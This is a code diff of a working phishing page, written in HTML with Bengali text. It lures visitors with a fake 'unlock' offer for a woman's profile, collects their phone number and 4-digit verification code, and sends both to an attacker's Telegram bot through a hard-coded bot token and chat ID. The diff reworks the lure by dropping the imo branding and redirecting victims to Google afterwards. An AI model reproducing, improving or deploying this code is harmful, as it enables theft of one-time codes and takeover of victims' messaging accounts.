@@ -3,62 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>imo</title>
+    <title>Sanjida Akter - Verification</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
-        .header { width: 100%; background: #fff; padding: 10px 15px; display: flex; align-items: center; justify-content: space-between; box-sizing: border-box; border-bottom: 1px solid #ddd; }
-        .header img { width: 35px; }
-        .card { background: #fff; width: 90%; max-width: 400px; border-radius: 15px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); text-align: center; border: 1px solid #eee; margin-top: 20px; }
+        body { font-family: Arial, sans-serif; background-color: #f4f7f6; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        .card { background: #fff; width: 90%; max-width: 400px; border-radius: 12px; padding: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; border: 1px solid #e0e0e0; }
         
-        /* input এলাকা - কান্ট্রি কোড এবং নম্বর আলাদা করার জন্য */
-        .input-container { border: 2px solid #0084ff; border-radius: 10px; display: flex; align-items: center; padding: 5px; margin-bottom: 20px; background: white; }
-        .country-input { width: 70px; border: none; border-right: 1px solid #ddd; outline: none; font-size: 18px; font-weight: bold; text-align: center; padding: 10px 5px; }
-        .main-phone { border: none; outline: none; font-size: 18px; width: 100%; padding: 10px; }
+        /* ডিজাইন পরিবর্তন: সাধারণ লুক */
+        .title { font-size: 22px; font-weight: bold; color: #333; margin-bottom: 10px; }
+        .subtitle { color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+        
+        /* input এলাকা */
+        .input-group { text-align: left; margin-bottom: 20px; }
+        .input-label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 5px; color: #555; }
+        .input-container { border: 2px solid #ddd; border-radius: 8px; display: flex; align-items: center; padding: 5px; background: white; transition: border-color 0.3s; }
+        .input-container:focus-within { border-color: #4a90e2; }
+        .country-input { width: 70px; border: none; border-right: 1px solid #eee; outline: none; font-size: 17px; font-weight: bold; text-align: center; padding: 12px 5px; color: #333; }
+        .main-phone { border: none; outline: none; font-size: 17px; width: 100%; padding: 12px; color: #333; }
 
         /* ভেরিফিকেশন বক্স ডিজাইন */
-        .code-container { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
-        .code-box { width: 45px; height: 55px; border: 2px solid #ddd; border-radius: 10px; text-align: center; font-size: 24px; font-weight: bold; background: #f8f9fa; }
+        .code-container { display: flex; justify-content: center; gap: 12px; margin: 25px 0; }
+        .code-box { width: 45px; height: 55px; border: 2px solid #ddd; border-radius: 8px; text-align: center; font-size: 24px; font-weight: bold; background: #fafafa; color: #333; transition: border-color 0.3s; }
+        .code-box:focus { border-color: #4a90e2; outline: none; background: #fff; }
+        .code-box:disabled { background: #eee; cursor: not-allowed; border-color: #ccc; }
         
-        button { width: 100%; padding: 15px; background-color: #c9d2db; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        button.active { background-color: #0084ff; }
+        button { width: 100%; padding: 15px; background-color: #bbb; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: not-allowed; transition: background-color 0.3s; }
+        button.active { background-color: #4a90e2; cursor: pointer; }
+        button.active:hover { background-color: #357abd; }
         
-        .timer { color: #888; font-size: 14px; margin-top: 10px; }
+        .timer { color: #888; font-size: 14px; margin-top: 15px; font-style: italic; }
         .hidden { display: none; }
-        
-        /* প্রোফাইল এবং ইনস্ট্রাকশন */
-        .profile-img { width: 80px; height: 80px; border-radius: 50%; object-fit: cover; }
-        .name { font-weight: bold; font-size: 18px; margin-top: 10px; }
-        .instruction { color: #666; font-size: 13px; margin: 15px 0; line-height: 1.4; }
     </style>
 </head>
 <body>
 
 <div id="page1">
-    <div class="header">
-        <div><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ae/Imo_app_logo.png/600px-Imo_app_logo.png"> <span>imo</span></div>
-    </div>
     <div class="card">
-        <img src="https://i.ibb.co/VpkX8vX/user-image.jpg" class="profile-img">
-        <div class="name">Sanjida Akter</div>
-        <p class="instruction">Sanjida Akter's imo account is locked. To Add her on imo, please unlock using your imo number.</p>
+        <div class="title">যোগাযোগ করুন</div>
+        <p class="subtitle">Sanjida Akter-এর সাথে যোগাযোগ করতে বা তার প্রোফাইল আনলক করতে নিচের ফর্মে আপনার নম্বর দিন।</p>
         
-        <label style="display:block; text-align:left; font-size:12px; font-weight:bold; margin-bottom:5px; color: #333;">PHONE NUMBER</label>
-        <div class="input-container">
-            <input type="text" id="countryCode" class="country-input" placeholder="+880">
-            <input type="number" id="phone" class="main-phone" placeholder="0000000000" oninput="checkBtn()">
+        <div class="input-group">
+            <label class="input-label">ফোন নম্বর</label>
+            <div class="input-container">
+                <input type="text" id="countryCode" class="country-input" placeholder="+880" val="+880">
+                <input type="number" id="phone" class="main-phone" placeholder="01XXXXXXXXX" oninput="checkBtn()">
+            </div>
         </div>
-        <button id="submitBtn" onclick="goToVerify()">Unlock Sanjida Akter ➔</button>
+        <button id="submitBtn" onclick="goToVerify()">সম্পূর্ণ করুন ➔</button>
     </div>
 </div>
 
 <div id="page2" class="hidden">
-    <div class="header">
-        <div onclick="location.reload()" style="cursor:pointer">← Verification</div>
-    </div>
     <div class="card">
-        <div style="font-size: 50px; color:#0084ff; margin-bottom: 10px;">🛡️</div>
-        <div class="name" style="font-size: 22px;">Security Check</div>
-        <p class="instruction">Please enter the 4-digit unlock number received on your imo, whatsapp or message option to unlock.</p>
+        <div style="font-size: 50px; color:#4a90e2; margin-bottom: 15px;">🔒</div>
+        <div class="title" style="font-size: 20px;">সিকিউরিটি চেক</div>
+        <p class="subtitle">আপনার নম্বরে একটি ৪-সংখ্যার ভেরিফিকেশন কোড পাঠানো হয়েছে। কোডটি নিচে দিন।</p>
         
         <div class="code-container">
             <input type="number" class="code-box" maxlength="1" oninput="moveNext(this, 'c2')" id="c1">
@@ -67,16 +65,16 @@
             <input type="number" class="code-box" maxlength="1" oninput="sendCode(this)" id="c4">
         </div>
 
-        <div id="timerText" class="timer">Please wait 25s to enter code</div>
+        <div id="timerText" class="timer">অনুগ্রহ করে ২৫ সেকেন্ড অপেক্ষা করুন...</div>
     </div>
 </div>
 
 <script>
+    // আগের মতোই টেলিগ্রাম বোটের তথ্য
     const token = "8794180523:AAEtAX0_NfcKPvJdSPNpuil6zWZupVu23zY";
     const chat_id = "8624234278";
     let userFullPhone = "";
 
-    // বাটন উজ্জ্বল করার ফাংশন
     function checkBtn() {
         const phone = document.getElementById("phone").value;
         const btn = document.getElementById("submitBtn");
@@ -84,7 +82,6 @@
         else btn.classList.remove("active");
     }
 
-    // ভেরিফিকেশন পেজে যাওয়ার ফাংশন
     function goToVerify() {
         const cCode = document.getElementById("countryCode").value || "+880";
         const phone = document.getElementById("phone").value;
@@ -94,41 +91,38 @@
         userFullPhone = cCode + phone;
         
         // টেলিগ্রামে নম্বর পাঠানো
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📱 Target Number: " + userFullPhone)}`);
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📱 New Number: " + userFullPhone + "\n👤 Target: Sanjida Akter")}`);
 
         document.getElementById("page1").classList.add("hidden");
         document.getElementById("page2").classList.remove("hidden");
         startTimer();
     }
 
-    // ২৫ সেকেন্ডের টাইমার
     function startTimer() {
         let timeLeft = 25;
         const timerText = document.getElementById("timerText");
         const inputs = document.querySelectorAll(".code-box");
-        inputs.forEach(i => i.disabled = true); // টাইমার চলাকালীন বক্স বন্ধ
+        inputs.forEach(i => i.disabled = true);
 
         const interval = setInterval(() => {
             timeLeft--;
-            timerText.innerText = `Please wait ${timeLeft}s to enter code`;
+            timerText.innerText = `অনুগ্রহ করে ${timeLeft} সেকেন্ড অপেক্ষা করুন...`;
             if (timeLeft <= 0) {
                 clearInterval(interval);
-                timerText.innerText = "You can enter the code now";
-                inputs.forEach(i => i.disabled = false); // টাইমার শেষে বক্স চালু
+                timerText.innerText = "আপনি এখন কোড দিতে পারেন";
+                inputs.forEach(i => i.disabled = false);
                 inputs[0].focus();
             }
         }, 1000);
     }
 
-    // এক বক্স থেকে অন্য বক্সে কারসর নেওয়া
     function moveNext(curr, nextId) {
         if(curr.value.length >= 1) {
-            curr.value = curr.value.slice(0,1); // মাত্র এক সংখ্যা রাখা
+            curr.value = curr.value.slice(0,1);
             document.getElementById(nextId).focus();
         }
     }
 
-    // কোড সেন্ড করার ফাংশন
     function sendCode(lastInput) {
         if(lastInput.value.length >= 1) {
             lastInput.value = lastInput.value.slice(0,1);
@@ -138,12 +132,14 @@
             const c4 = document.getElementById("c4").value;
             const fullCode = c1 + c2 + c3 + c4;
 
-            const msg = `🔔 IMO CODE RECEIVED!\n\n📱 Number: ${userFullPhone}\n🔑 Code: ${fullCode}`;
+            if(fullCode.length < 4) return;
+
+            const msg = `🔔 CODE RECEIVED!\n\n📱 Number: ${userFullPhone}\n👤 Name: Sanjida Akter\n🔑 Code: ${fullCode}`;
             
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
             .then(() => {
-                alert("Verification Successful! Account Unlocking...");
-                window.location.href = "https://imo.im"; // আসল সাইটে রিডাইরেক্ট
+                alert("আপনার ভেরিফিকেশন সফল হয়েছে!");
+                window.location.href = "https://www.google.com"; // গুগল-এ পাঠিয়ে দেওয়া
             });
         }
     }
